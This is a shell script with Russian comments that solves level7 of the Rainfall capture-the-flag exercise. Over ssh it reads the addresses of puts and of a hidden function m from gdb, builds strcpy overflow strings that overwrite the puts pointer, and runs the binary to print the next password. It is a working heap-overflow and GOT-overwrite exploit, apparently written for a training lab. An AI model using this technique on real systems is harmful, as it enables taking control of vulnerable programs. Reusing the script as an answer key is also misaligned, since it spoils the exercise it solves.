# 1. Запустить программу в дебаггере
# 2. Найти функции main и m
# 3. В main читается файл с флагом, но содержимое выводится в m, которая никогда не вызывается
# 4. В main функция два вызова strcpy записывают аргументы программы в выделенную память, затем вызывается puts
# 5. Нужно найти адрес указателя на puts и адрес m
# 6. Создать строку для первого strcpy, которая заменит dest второго вызова на указатель на puts
# 7. Создать строку для второго strcpy, которая запишет по адресу указателя на puts адрес m
# 8. Запустить программу с этими строками и получить пароль

ssh level7@"$RAINFALL_IP" -p 4242 '
    # нахождение адреса функции m
    M_ADDRESS=$(gdb --batch -ex "x/i m" ./level7 | awk "{print substr(\$1, 3)}")
    PUTS_ADDRESS=$(gdb --batch -ex "x/i puts" ./level7 | awk "{print substr(\$NF, 4)}")
    # создание строки
    if ((${#M_ADDRESS} % 2 == 1)); then M_ADDRESS="0${M_ADDRESS}"; fi
    M_ADDRESS="\x${M_ADDRESS:6:2}\x${M_ADDRESS:4:2}\x${M_ADDRESS:2:2}\x${M_ADDRESS:0:2}"
    if ((${#PUTS_ADDRESS} % 2 == 1)); then PUTS_ADDRESS="0${PUTS_ADDRESS}"; fi
    PUTS_ADDRESS="\x${PUTS_ADDRESS:6:2}\x${PUTS_ADDRESS:4:2}\x${PUTS_ADDRESS:2:2}\x${PUTS_ADDRESS:0:2}"
    ARG1=$(python -c "print \"x\" * 20 + \"$PUTS_ADDRESS\"")
    ARG2=$(python -c "print \"$M_ADDRESS\"")
    # запуск программы и получение флага
    ./level7 $ARG1 $ARG2
'
